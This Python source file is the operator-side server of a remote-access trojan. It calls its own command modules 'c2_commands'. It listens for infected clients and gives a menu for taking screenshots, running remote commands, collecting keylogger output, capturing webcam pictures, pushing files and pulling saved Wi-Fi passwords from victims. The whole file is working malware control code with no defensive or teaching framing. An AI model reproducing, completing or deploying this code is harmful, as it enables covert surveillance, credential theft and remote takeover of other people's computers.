import socket
import threading

from c2_commands import screenshot, execute_command, save_keylogs, send_file, receive_webcam_picture

def list_connected_clients(connected_clients):
    print("\nConnected Clients:")
    for idx, client_address in enumerate(connected_clients, start=1):
        print(f"{idx}. {client_address[0]}")

def client_menu(client_socket, client_address):
    while True:
        subcommand = input(f"Enter a command for {client_address[0]} ('screenshot', 'cmd', 'logs', 'webcam', 'file [file_path]', 'creds', 'back'): ")

        if subcommand == "screenshot":
            client_socket.sendall(b"screenshot")
            screenshot.take_screenshot(client_socket, client_address)

        elif subcommand == "cmd":
            execute_command.execute_command(client_socket, client_address)

        elif subcommand == "logs":
            client_socket.sendall(b"logs")
            save_keylogs.save_keylogs(client_socket, client_address)

        elif subcommand == "webcam":
            client_socket.sendall(b"webcam")
            receive_webcam_picture.receive_webcam_picture(client_socket, client_address)

        elif subcommand == "creds":
            client_socket.sendall(b"creds")
            password_data = client_socket.recv(4096).decode('utf-8')
            print("Wi-Fi Passwords:")
            print(password_data)

        elif subcommand.startswith("file"):
            try:
                _, file_path = subcommand.split()
                client_socket.sendall(f"file {file_path}".encode('utf-8'))
                send_file.send_file(client_socket, file_path)
            except ValueError:
                print("Please enter the file path after 'file' command.")

        elif subcommand == "back":
            break

        else:
            print("Invalid command.")

def handle_client(client_socket, client_address, connected_clients):
    print(f"\nClient connected: {client_address[0]}")
    connected_clients.append(client_address)

    try:
        while True:
            command = input("Enter a command ('list', 'client [ip]', 'exit'): ")

            if command == "list":
                list_connected_clients(connected_clients)

            elif command.startswith("client"):
                try:
                    _, ip = command.split()
                    selected_client = None
                    for client_addr in connected_clients:
                        if client_addr[0] == ip:
                            selected_client = client_addr
                            break

                    if selected_client:
                        print(f"Selected client: {selected_client[0]}")
                        client_menu(client_socket, selected_client)
                    else:
                        print(f"Client with IP {ip} not found.")

                except ValueError:
                    print("Please enter an IP address after 'client' command.")

            elif command == "exit":
                break

            else:
                print("Invalid command.")
    
    except Exception as e:
        print(f"Error occurred - {e}")

    print(f"Connection with {client_address[0]} closed.")
    connected_clients.remove(client_address)
    client_socket.close()

def start_server(host, port):
    connected_clients = []
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(5)
    print(f"Listening for connections on {host}:{port}...")

    try:
        while True:
            client_socket, client_address = server_socket.accept()
            print(f"Accepted connection from {client_address[0]}")
            client_handler = threading.Thread(target=handle_client, args=(client_socket, client_address, connected_clients))
            client_handler.start()

    except Exception as e:
        print(f"Error occurred - {e}")
    pass

if __name__ == "__main__":
    host = '0.0.0.0'  # Listen on all available network interfaces
    port = 1112       # Use the same port number as the client
    start_server(host, port)